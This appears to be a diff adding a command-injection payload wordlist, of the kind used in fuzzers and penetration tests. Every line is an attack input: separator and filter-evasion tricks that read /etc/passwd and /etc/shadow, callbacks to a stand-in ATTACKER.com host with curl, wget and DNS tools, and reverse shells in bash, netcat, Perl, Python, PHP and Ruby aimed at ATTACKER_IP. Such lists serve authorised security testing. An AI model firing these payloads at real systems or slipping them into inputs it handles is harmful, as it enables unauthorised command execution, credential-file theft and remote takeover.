@@ -1,0 +1,140 @@
+$(curl ATTACKER.com)
+$(dig ATTACKER.com)
+$(host ATTACKER.com)
+$(id)
+$(nslookup ATTACKER.com)
+$(ping -c 1 ATTACKER.com)
+$(ping -c 5 127.0.0.1)
+$(sleep 5)
+$(uname -a)
+$(wget ATTACKER.com)
+$(whoami)
+%0a%0did
+%0a%0dwhoami
+%0aid
+%0awhoami
+%0d%0a%0d%0aid
+%0d%0awhoami
+%0dwhoami
+& ping -n 5 127.0.0.1
+& whoami
+&dir
+&ipconfig
+&whoami
+;$'\167\150\157\141\155\151'
+;$'\x69\x64'
+;$({id})
+;(id)
+;/???/??t /etc/passwd
+;/???/c?t /???/p??s??
+;/bin/bash -c id
+;/bin/c?t /etc/passwd
+;/bin/ca? /etc/passwd
+;/bin/cat /etc/passwd
+;/bin/sh -c id
+;/usr/bin/id
+;/usr/bin/whoami
+;\w\h\o\a\m\i
+;a=c;b=at;c=' /et';d=c/pas;e=swd;$a$b$c$d$e
+;a=i;b=d;$a$b
+;a=who;b=ami;$a$b
+;awk 'BEGIN{system("id")}'
+;bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
+;bash<<<$(base64 -d<<<aWQ=)
+;c"a"t /etc/passwd
+;c'a't /etc/passwd
+;c\at /etc/passwd
+;ca$()t /etc/passwd
+;ca$@t /etc/passwd
+;ca``t /etc/passwd
+;cat /etc/passwd
+;cat /etc/shadow
+;cat$'\x20'/etc/passwd
+;cat$IFS/etc/passwd
+;cat${IFS}/etc/passwd
+;cat%09/etc/passwd
+;cat%0a/etc/passwd
+;cat%20/etc/passwd
+;cat</etc/passwd
+;curl ATTACKER.com
+;dig ATTACKER.com
+;echo -e '\x69\x64' | sh
+;echo -e '\x77\x68\x6f\x61\x6d\x69' | sh
+;echo 1;id;echo 2
+;echo aWQ= | base64 -d | sh
+;echo d2hvYW1p | base64 -d | sh
+;echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh
+;echo${IFS}"test"
+;eval id
+;find / -name passwd -exec cat {} \;
+;host ATTACKER.com
+;id
+;id&&whoami&&uname -a
+;id;
+;id;whoami;uname -a
+;id||whoami||uname -a
+;IFS=,;`cat<<</etc/passwd`
+;ls
+;ls -la /
+;nc -e /bin/sh ATTACKER_IP 4444
+;node -e 'require("child_process").execSync("id").toString()'
+;nslookup ATTACKER.com
+;perl -e 'system("id")'
+;perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'
+;php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+;php -r 'system("id");'
+;ping -c 1 ATTACKER.com
+;ping -c 5 127.0.0.1
+;printf '\x69\x64' | sh
+;python -c "import os;os.system('id')"
+;python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+;python3 -c "import os;os.system('id')"
+;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f
+;ruby -e 'system("id")'
+;ruby -rsocket -e'f=TCPSocket.open("ATTACKER_IP",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+;sleep 10 #
+;sleep 5
+;sleep 5;
+;sleep${IFS}5
+;test=id;$test
+;uname -a
+;w"h"o"a"m"i
+;w${IFS}h${IFS}o${IFS}a${IFS}m${IFS}i
+;w'h'o'a'm'i
+;wget ATTACKER.com
+;whoami
+;X=$'cat\x20/etc/passwd'&&$X
+;{cat,/etc/passwd}
+;{id}
+\n\rid
+\nid
+\rid
+`id`
+`nslookup ATTACKER.com`
+`ping -c 5 127.0.0.1`
+`sleep 5`
+`whoami`
+| ping -n 5 127.0.0.1
+| whoami
+|cat /etc/passwd
+|curl ATTACKER.com
+|id
+|id|
+|ipconfig
+|nslookup ATTACKER.com
+|ping -c 1 ATTACKER.com
+|ping -c 5 127.0.0.1
+|sleep 10 #
+|sleep 5
+|sleep 5|
+|sleep${IFS}5
+|uname -a
+|wget ATTACKER.com
+|whoami
+|| ping -n 5 127.0.0.1
+|| whoami
+||dir
+||id
+||ping -c 5 127.0.0.1
+||sleep 5
+||whoami
